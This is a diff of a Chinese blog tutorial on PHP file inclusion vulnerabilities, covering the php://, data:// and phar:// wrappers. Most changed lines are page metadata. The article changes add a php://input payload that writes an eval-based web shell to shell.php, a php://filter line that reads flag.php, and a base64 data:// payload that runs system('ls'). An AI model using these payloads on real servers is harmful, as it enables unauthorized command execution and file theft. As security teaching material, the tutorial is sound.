@@ -23,7 +23,7 @@
 <meta name="description" content="前言当服务器开启allow_url_include选项时，就可以通过PHP的某些特性函数（include()，require()和include_once()，requir_once()）利用URL去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="php文件包含漏洞">
-<meta property="og:url" content="http://example.com/2022/02/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:url" content="http://example.com/2022/02/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="mayylu">
 <meta property="og:description" content="前言当服务器开启allow_url_include选项时，就可以通过PHP的某些特性函数（include()，require()和include_once()，requir_once()）利用URL去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行.">
 <meta property="og:locale">
@@ -31,17 +31,17 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220326211707.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220326212351.png">
 <meta property="article:published_time" content="2022-02-05T11:11:29.000Z">
-<meta property="article:modified_time" content="2022-07-28T07:53:45.064Z">
+<meta property="article:modified_time" content="2022-09-26T15:50:26.479Z">
 <meta property="article:author" content="mayylu">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/Screenshot_2022-07-20-20-19-01-40_149003a2d400f6adb210d7e357a3a646.jpg.jpg">
 
 
-<link rel="canonical" href="http://example.com/2022/02/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
+<link rel="canonical" href="http://example.com/2022/02/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-Hans","comments":true,"permalink":"http://example.com/2022/02/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","path":"2022/02/05/文件包含漏洞/","title":"php文件包含漏洞"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-Hans","comments":true,"permalink":"http://example.com/2022/02/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","path":"2022/02/05/php文件包含漏洞/","title":"php文件包含漏洞"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
 <title>php文件包含漏洞 | mayylu</title>
@@ -124,7 +124,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-count">14</span>
           <span class="site-state-item-name">المقالات</span>
         </a>
       </div>
@@ -169,7 +169,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -200,7 +200,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">عُدل في</span>
-        <time title="عُدل: 2022-07-28 15:53:45" itemprop="dateModified" datetime="2022-07-28T15:53:45+08:00">2022-07-28</time>
+        <time title="عُدل: 2022-09-26 23:50:26" itemprop="dateModified" datetime="2022-09-26T23:50:26+08:00">2022-09-26</time>
       </span>
 
   
@@ -242,12 +242,12 @@
 <li>php://协议<br>php:// — 访问各个输入/输出流（I/O streams）  </li>
 </ul>
 <ol>
-<li>php://input协议<br>可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行<br><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220326211707.png" alt="QQ截图20220326211707"><br>利用php://input还可以写入php木马,即在post中传入如下代码：<br><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);?&gt;</code></li>
-<li>php://filter协议<br>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。<br><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220326212351.png" alt="QQ截图20220326212351"><br>我们平时是这样利用它来读取任意文件的：<br><code>php://filter/read=convert.base64-encode/resource=flag.php</code><br>在这个payload里，convert.base64-encode就是一个过滤器,而flag.php就是要过滤的数据流，也就是要读取的文件。   </li>
+<li>php://input协议<br>可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行<br><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220326211707.png" alt="QQ截图20220326211707"><br>利用php://input还可以写入php木马,即在post中传入如下代码：<br><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39;);?&gt;</code></li>
+<li>php://filter协议<br>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。<br><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220326212351.png" alt="QQ截图20220326212351"><br>我们平时是这样利用它来读取任意文件的：<br><code>php://filter/read=convert.base64-encode/resource=flag.php</code><br>在这个payload里，convert.base64-encode就是一个过滤器,而flag.php就是要过滤的数据流，也就是要读取的文件。<br><code>php://filter/read=string.rot13/resource=flag.php</code><br>ROT-13 编码是一种每一个字母被另一个字母代替的方法。 这个代替字母是由原来的字母向前移动 13 个字母而得到的</li>
 </ol>
 <ul>
-<li><p>data://text/plain协议<br>data:（» RFC 2397）数据流封装器(同样类似与php://input)。<br>使用方法:<br>?page=data://text/plain,xxxxxxx<br>data://text/plain;base64,(base64编码后的数据)       </p>
-</li>
+<li><p>data://text/plain协议<br>data:（» RFC 2397）数据流封装器(同样类似与php://input)。<br>使用方法:<br>?page=data://text/plain,xxxxxxx<br>data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw==</p>
+<?php system('ls');        </li>
 <li><p>phar://<br>phar:// — PHP 归档<br>phar:// 数据流包装器。详细的描述可参见 Phar 数据流包装器。<br>用法(隐藏后门)<br>?phar://test.zip/test.txt      </p>
 </li>
 </ul>
@@ -264,13 +264,13 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2022/02/02/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E8%B7%B5/" rel="prev" title="SQL注入实践">
-                  <i class="fa fa-chevron-left"></i> SQL注入实践
+                <a href="/2022/02/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="prev" title="文件上传漏洞">
+                  <i class="fa fa-chevron-left"></i> 文件上传漏洞
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2022/02/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="next" title="文件上传漏洞">
-                  文件上传漏洞 <i class="fa fa-chevron-right"></i>
+                <a href="/2022/02/11/HTML/" rel="next" title="HTML">
+                  HTML <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
